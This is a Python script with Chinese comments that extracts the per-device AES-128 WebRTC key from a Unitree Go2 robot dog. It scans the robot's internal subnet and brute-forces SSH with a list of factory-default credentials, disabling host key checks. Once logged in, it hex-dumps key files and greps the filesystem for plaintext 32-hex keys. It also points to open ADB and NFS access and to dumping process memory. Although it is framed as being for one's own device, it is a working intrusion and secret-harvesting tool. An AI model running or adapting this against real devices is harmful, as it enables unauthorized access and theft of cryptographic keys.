#!/usr/bin/env python3
"""从**你自己的** Go2 内网取 WebRTC 握手用的每设备 AES-128 钥匙（data2=3 固件）。

原理：固件 ≥1.1.15 的机器狗，WiFi 侧 WebRTC 握手要用一把每设备 AES-128 钥匙；
但它本地必须持有**明文**钥匙（信令服务要用它加密 con_notify 的 data1），
所以只要能进到机器狗内网拿到 shell/文件访问，就能把钥匙取出来。

前提：网线插机器狗 RJ45 网口，电脑有线网卡设 192.168.123.100/24（无网关）。

执行顺序（越靠前越可能成功）：
  A. 扫内网存活主机 + 服务端口
  B. 有 5555(ADB)  → adb shell（Jetson 上常是 root）
  C. 有 22(SSH)    → 试出厂默认凭据
  D. 有 2049(NFS)  → mount 共享目录，直接读钥匙文件
  E. 有 80/8080    → 看是否有未鉴权的配置/升级接口
  F. 都不通        → 走 DDS 侧服务（另见 tools/dds_raw.py：rt/api/bashrunner、programming_actuator）

用法: python3 _key_extract.py [--subnet 192.168.123.0/24]
"""

import argparse
import ipaddress
import re
import shutil
import socket
import subprocess
import sys
from concurrent.futures import ThreadPoolExecutor

CREDS = [
    ("unitree", "123"), ("root", "123"), ("unitree", "unitree"),
    ("root", "root"), ("ubuntu", "ubuntu"), ("unitree", "unitree123"),
    ("admin", "admin"), ("pi", "raspberry"),
]

# 重点关注：22 SSH / 23 telnet / 5555 ADB / 2049 NFS / 9991 信令 / 80·8080·8888 Web
PORTS = [22, 23, 80, 443, 5555, 8080, 8888, 9991, 5000, 2049, 111, 8000, 8081, 9090]

# 拿到 shell 后要执行的命令（找钥匙文件 / 明文钥匙 / 信令进程）
PROBE_CMDS = [
    ("钥匙目录", "ls -l /unitree/etc/key/ 2>/dev/null"),
    ("钥匙文件 hex", "xxd -p /unitree/etc/key/aes_key.bin 2>/dev/null | head -5"),
    ("找 aes/key 相关文件",
     "find / -maxdepth 5 \\( -iname '*aes*' -o -iname '*gcm*' -o -iname '*key*' \\) "
     "-type f 2>/dev/null | grep -v proc | head -30"),
    ("找 32 位 hex 明文钥匙",
     "grep -rIoE '\\b[0-9a-f]{32}\\b' /unitree /etc 2>/dev/null | head -20"),
    ("信令/WebRTC 进程", "ps aux 2>/dev/null | grep -iE 'webrtc|signaling|con_notify' | grep -v grep"),
    ("设备序列号", "cat /unitree/etc/sn 2>/dev/null || cat /etc/hostname"),
]


def tcp_open(ip, port, timeout=0.5):
    s = socket.socket()
    s.settimeout(timeout)
    try:
        s.connect((ip, port))
        return True
    except OSError:
        return False
    finally:
        s.close()


def scan(subnet):
    hosts = [str(h) for h in ipaddress.ip_network(subnet).hosts()]

    def probe(ip):
        open_ports = [p for p in PORTS if tcp_open(ip, p)]
        return (ip, open_ports) if open_ports else None

    print(f"[A] 扫描 {subnet}（端口 {PORTS}）...")
    found = []
    with ThreadPoolExecutor(max_workers=64) as ex:
        for r in ex.map(probe, hosts):
            if r:
                print(f"    {r[0]}: {r[1]}")
                found.append(r)
    if not found:
        print("    没发现任何开放端口。检查：网线是否插稳、网卡是否设为 192.168.123.100/24")
    return found


def try_ssh(ip):
    for user, pwd in CREDS:
        try:
            r = subprocess.run(
                ["sshpass", "-p", pwd, "ssh", "-o", "StrictHostKeyChecking=no",
                 "-o", "UserKnownHostsFile=/dev/null", "-o", "ConnectTimeout=6",
                 "-o", "PreferredAuthentications=password", "-o", "PubkeyAuthentication=no",
                 f"{user}@{ip}", "echo LOGIN_OK; id"],
                capture_output=True, text=True, timeout=25)
        except Exception:  # noqa: BLE001
            continue
        if "LOGIN_OK" in r.stdout:
            print(f"    ✓ SSH 登录成功 {user}/{pwd}")
            print("      " + r.stdout.strip().replace("\n", " | "))
            return user, pwd
    return None


def harvest(user, pwd, host):
    keys = set()
    print(f"\n[C] 在 {host} 上收集钥匙线索 ...")
    for title, cmd in PROBE_CMDS:
        try:
            r = subprocess.run(
                ["sshpass", "-p", pwd, "ssh", "-o", "StrictHostKeyChecking=no",
                 "-o", "UserKnownHostsFile=/dev/null", "-o", "ConnectTimeout=6",
                 f"{user}@{host}", cmd],
                capture_output=True, text=True, timeout=40)
            out = (r.stdout or r.stderr).strip()
        except Exception as e:  # noqa: BLE001
            out = f"(执行失败: {e})"
        print(f"\n--- {title} ---")
        print("\n".join("  " + ln for ln in out.splitlines()[:20]) or "  (空)")
        for m in re.findall(r"\b[0-9a-f]{32}\b", out.lower()):
            if len(set(m)) > 4:
                keys.add(m)

    if keys:
        print("\n=== 候选钥匙（32 位 hex）===")
        for k in sorted(keys):
            print("  " + k)
        with open("keys.txt", "a", encoding="utf-8") as f:
            for k in sorted(keys):
                f.write(k + "\n")
        print("已写入 keys.txt —— 客户端会自动装载；用 _verify_key.py 验证后再用。")
    else:
        print("\n没直接匹配到 32 位 hex。下一步：把 /unitree/etc/key/ 整个目录 scp 出来分析，"
              "或 dump 信令进程内存找明文 key。")
    return keys


def check_extras(ip, ports):
    if 5555 in ports:
        print(f"    [!] {ip}:5555 ADB 开放 —— 若本机装了 adb，可 `adb connect {ip}:5555` 后 adb shell")
    if 2049 in ports:
        print(f"    [!] {ip}:2049 NFS 开放 —— 可 `showmount -e {ip}` 后 mount 共享目录直接读钥匙文件")
        try:
            r = subprocess.run(["showmount", "-e", ip], capture_output=True, text=True, timeout=10)
            print("        showmount: " + (r.stdout or r.stderr).strip().replace("\n", " | "))
        except Exception:  # noqa: BLE001
            pass
    for web in (80, 8080, 8888, 8000):
        if web in ports:
            try:
                r = subprocess.run(
                    ["curl", "-s", "-m", "5", "-i", f"http://{ip}:{web}/"],
                    capture_output=True, text=True, timeout=10)
                head = (r.stdout or "")[:200].replace("\n", " | ")
                print(f"    [!] {ip}:{web} HTTP → {head}")
            except Exception:  # noqa: BLE001
                pass


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--subnet", default="192.168.123.0/24")
    args = ap.parse_args()

    if not shutil.which("sshpass"):
        print("缺少 sshpass：sudo apt install -y sshpass")
        return 1

    hosts = scan(args.subnet)
    if not hosts:
        return 1

    print("\n[B] 检查 ADB / NFS / Web 等旁路入口 ...")
    for ip, ports in hosts:
        check_extras(ip, ports)

    print("\n[C] 对开放 22 的主机尝试出厂默认凭据 ...")
    for ip, ports in hosts:
        if 22 in ports:
            print(f"  {ip}:")
            cred = try_ssh(ip)
            if cred:
                harvest(cred[0], cred[1], ip)
                return 0
    print("\n没有可用 SSH。下一步走 DDS 侧服务（rt/api/bashrunner、programming_actuator）——"
          "见 tools/dds_raw.py / 让 AI 继续。")
    return 1


if __name__ == "__main__":
    sys.exit(main())
